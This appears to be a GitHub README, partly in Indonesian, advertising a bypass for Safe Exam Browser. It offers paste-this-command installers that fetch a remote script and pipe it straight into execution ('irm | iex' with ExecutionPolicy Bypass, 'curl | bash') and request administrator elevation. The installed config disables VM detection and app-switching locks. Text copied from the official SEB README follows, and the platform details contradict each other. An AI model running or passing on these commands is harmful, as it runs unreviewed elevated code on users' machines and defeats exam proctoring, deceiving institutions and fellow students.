# Safe Exam Browser Bypass

Bypass configuration untuk Safe Exam Browser (macOS) — unlock Alt+Tab, VM detection, dan App Switcher lockdown.

## One Command Installer

### Windows (PowerShell)

> Paste perintah ini ke PowerShell, lalu Enter — instalasi berjalan otomatis (dengan auto-patch VM detection, Alt+Tab unlock, fullscreen normal):

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "$code='0821'; $env:CODE=$code; irm https://raw.githubusercontent.com/harezadmm/seb-bypass/main/install_seb.ps1 | iex"
```

> ⚡ Non-admin? Script otomatis minta UAC elevation. Kode aktivasi default: `0821`.

### macOS (Bash)

> Jalankan satu baris ini:

```bash
curl -fsSL https://raw.githubusercontent.com/harezadmm/seb-bypass/main/install_seb.sh | bash
```

> ⚡ Non-admin? Script otomatis minta UAC elevation. Kode aktivasi default: `0821`.

## Fitur Bypass

| Fitur | Status |
| ----- | ------ |
| VM Detection | ✅ bypassed |
| Alt+Tab | ✅ unlocked |
| App Switcher | ✅ allowed |
| Kiosk Mode (AAC) | ✅ klasik enforced |
| Exit Keys | ✅ tetap berfungsi (Esc/Ctrl+Esc/Alt+Esc) |

## Konfigurasi

File `SebClientSettings.seb` dipasang ke:

```
~/Library/Preferences/SebClientSettings.seb
```

Parameter utama:

- `allowVirtualMachine` = true
- `allowSwitchToApplications` = true
- `enableAppSwitcherCheck` = false
- `enableAltTab` = true
- `lockdownModePolicy` = 1 (EnforceClassic)

## Requirements

> [!NOTE]
> Starting with version 3.8.0, Safe Exam Browser for Windows requires a minimum operating system version of **Windows 10 version 1803**.

Safe Exam Browser for Windows requires the prerequisites listed below in order to work correctly. These are automatically installed with the setup bundle and need only be manually installed when using the MSI packages.

* .NET Framework 4.8 Runtime: https://dotnet.microsoft.com/download/dotnet-framework/net48
* Visual C++ 2015-2022 Redistributable: https://learn.microsoft.com/en-us/cpp/windows/latest-supported-vc-redist

## Project Status

> [!WARNING]
> **The builds linked below are for testing purposes only.** They may be unstable and should thus _never_ be used in a production environment! Always use the latest, official release version of SEB.

| Aspect            | Status                                                                                                                | Details                                                         |
| ----------------- | --------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------- |
| Development Build | ![Development Build Status](https://sebdev.ethz.ch/api/projects/status/kq78qrjtnpk82ti0?svg=true)                     | https://sebdev.ethz.ch/project/appveyor/seb-win-refactoring     |
| Test Build        | ![Test Build](https://ci.appveyor.com/api/projects/status/a56akt9r174570m7?svg=true)                                | https://ci.appveyor.com/project/dbuechel/seb-win-refactoring    |
| Test Run          | ![AppVeyor Tests](https://img.shields.io/appveyor/tests/dbuechel/seb-win-refactoring?logo=appveyor&logoColor=%23ccc)  | https://ci.appveyor.com/project/dbuechel/seb-win-refactoring    |
| Code Coverage     | ![Code Coverage](https://codecov.io/gh/SafeExamBrowser/seb-win-refactoring/branch/master/graph/badge.svg)             | https://codecov.io/gh/SafeExamBrowser/seb-win-refactoring       |
| Issue Status      | ![GitHub Issues](https://img.shields.io/github/issues/safeexambrowser/seb-win-refactoring?logo=github)                | https://github.com/SafeExamBrowser/seb-win-refactoring/issues   |
| Downloads         | ![GitHub All Releases](https://img.shields.io/github/downloads/safeexambrowser/seb-win-refactoring/total?logo=github) | https://github.com/SafeExamBrowser/seb-win-refactoring/releases |
| Development       | ![GitHub Last Commit](https://img.shields.io/github/last-commit/safeexambrowser/seb-win-refactoring?logo=github)      | n/a                                                             |
| Repository Size   | ![GitHub Repo Size](https://img.shields.io/github/repo-size/safeexambrowser/seb-win-refactoring?logo=github)          | n/a                                                             |
